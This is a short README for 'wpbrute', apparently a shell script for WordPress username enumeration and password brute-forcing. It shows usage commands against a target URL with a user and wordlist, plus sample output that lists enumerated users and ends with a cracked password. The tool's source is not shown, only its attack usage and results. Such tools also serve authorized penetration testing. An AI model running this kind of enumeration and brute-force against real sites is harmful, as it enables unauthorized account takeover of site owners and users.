WPBRUTE
=======

Wordpress user enumeration and password bruteforce.

#User Enumeration:

<code>$ ./wpbrute.sh --url=www.example.com</code>
<pre>
[+] Username or nickname enumeration
admin
testuser
</pre>

#Password Bruteforce:

<code>$ ./wpbrute.sh --url=www.example.com --user=admin --wordlist=wordlist.txt</code>
<pre>
[+] Bruteforcing user [admin]
123456
test123
123test123
The password is: 123test123
</pre>
